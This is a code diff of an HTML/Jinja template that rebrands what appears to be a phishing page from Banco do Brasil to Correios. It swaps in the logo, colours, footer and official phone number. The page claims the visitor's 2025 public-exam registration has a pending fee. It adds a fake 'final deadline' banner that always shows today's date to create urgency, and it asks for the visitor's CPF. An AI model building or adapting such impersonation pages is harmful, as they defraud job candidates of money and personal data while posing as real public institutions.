@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Banco do Brasil - Verificação de Taxa</title>
+    <title>Correios - Verificação de Taxa</title>
 
     <!-- Preload fonts -->
     <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
@@ -32,8 +32,8 @@
             theme: {
                 extend: {
                     colors: {
-                        'bb-yellow': '#FEEF37',
-                        'bb-blue': '#003DA5',
+                        'correios-blue': '#003399',
+                        'correios-yellow': '#FEEF37',
                     }
                 }
             }
@@ -42,16 +42,16 @@
 </head>
 <body class="bg-gray-50 min-h-screen flex flex-col">
     <!-- Header -->
-    <div class="bg-bb-yellow py-4 shadow-sm">
+    <div class="bg-correios-yellow py-4 shadow-sm">
         <div class="container mx-auto px-4">
             <div class="flex flex-col items-center text-center">
-                <img src="https://i.ibb.co/WvBH03fD/png-transparent-banco-do-brasil-hd-logo-thumbnail-removebg-preview-1.png" alt="Logo do Banco do Brasil" class="h-12 mb-2" />
+                <img src="https://logodownload.org/wp-content/uploads/2014/05/correios-logo-1-1.png" alt="Logo dos Correios" class="h-12 mb-2" />
                 <div>
-                    <p class="text-bb-blue text-[16px] leading-tight font-bold tracking-wide">
+                    <p class="text-correios-blue text-[16px] leading-tight font-bold tracking-wide">
                         CONCURSO PÚBLICO 2025
                     </p>
-                    <p class="text-bb-blue text-[12px] leading-tight tracking-wide">
-                        SELEÇÃO EXTERNA PARA CARREIRA ADMINISTRATIVA
+                    <p class="text-correios-blue text-[12px] leading-tight tracking-wide">
+                        SELEÇÃO EXTERNA PARA MÚLTIPLOS CARGOS
                     </p>
                 </div>
             </div>
@@ -59,7 +59,7 @@
     </div>
 
     <!-- Blue bar -->
-    <div class="bg-bb-blue py-3 shadow-md">
+    <div class="bg-correios-blue py-3 shadow-md">
         <div class="container mx-auto px-4 flex items-center">
             <div class="grid grid-cols-2 gap-0.5 mr-3 drop-shadow-sm">
                 <div class="w-2 h-2 bg-white"></div>
@@ -76,6 +76,20 @@
         <div class="max-w-2xl mx-auto">
             <div class="bg-white rounded-lg shadow-md p-6">
                 <div class="mb-6">
+                    <!-- Prazo Final Alert -->
+                    <div class="bg-red-50 border-l-4 border-red-400 p-4 mb-6">
+                        <div class="flex">
+                            <div class="flex-shrink-0">
+                                <i class="fas fa-clock text-red-400"></i>
+                            </div>
+                            <div class="ml-3">
+                                <p class="text-sm text-red-700">
+                                    <span class="font-bold">PRAZO FINAL:</span> {{ current_day }}/{{ current_month }}/{{ current_year }} às 23h59
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+
                     <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
                         <div class="flex">
                             <div class="flex-shrink-0">
@@ -83,7 +97,7 @@
                             </div>
                             <div class="ml-3">
                                 <p class="text-sm text-yellow-700">
-                                    Foi identificada 1 pendência na sua inscrição para o Concurso do Banco do Brasil 2025. Além da Taxa de Inscrição também é nescessário o pagamento da Taxa de Aplicação da Banca Organizadora.
+                                    Foi identificada 1 pendência na sua inscrição para o Concurso dos Correios 2025. Além da Taxa de Inscrição também é necessário o pagamento da Taxa de Aplicação da Banca Organizadora.
                                 </p>
                             </div>
                         </div>
@@ -94,7 +108,7 @@
                             <label for="cpf" class="block text-sm font-medium text-gray-700 mb-1">CPF do Candidato</label>
                             <div class="relative">
                                 <input type="text" id="cpf" name="cpf" 
-                                       class="w-full px-4 py-2 border rounded-lg focus:ring-bb-blue focus:border-bb-blue"
+                                       class="w-full px-4 py-2 border rounded-lg focus:ring-correios-blue focus:border-correios-blue"
                                        required
                                        inputmode="numeric"
                                        maxlength="14"
@@ -104,7 +118,7 @@
                             </div>
                         </div>
 
-                        <button type="submit" id="submitBtn" class="w-full bg-bb-blue hover:bg-opacity-90 text-white font-bold py-3 px-6 rounded-md flex items-center justify-center space-x-2 shadow-md hover:shadow-lg transition duration-200">
+                        <button type="submit" id="submitBtn" class="w-full bg-correios-blue hover:bg-opacity-90 text-white font-bold py-3 px-6 rounded-md flex items-center justify-center space-x-2 shadow-md hover:shadow-lg transition duration-200">
                             <span id="btnText">Verificar Pendências</span>
                             <i id="btnIcon" class="fas fa-arrow-right ml-2"></i>
                             <svg id="btnSpinner" class="animate-spin h-5 w-5 text-white hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
@@ -119,9 +133,9 @@
     </div>
 
     <!-- Footer -->
-    <div class="bg-bb-yellow text-bb-blue text-center py-4 mt-auto shadow-inner">
-        <p class="text-sm font-medium">© {{ current_year }} Banco do Brasil S.A. Todos os direitos reservados.</p>
-        <p class="text-sm mt-1">Central de Atendimento BB - 0800 729 0722</p>
+    <div class="bg-correios-yellow text-correios-blue text-center py-4 mt-auto shadow-inner">
+        <p class="text-sm font-medium">© {{ current_year }} Empresa Brasileira de Correios e Telégrafos. Todos os direitos reservados.</p>
+        <p class="text-sm mt-1">Central de Atendimento dos Correios - 0800 725 0100</p>
     </div>
 
     <script>
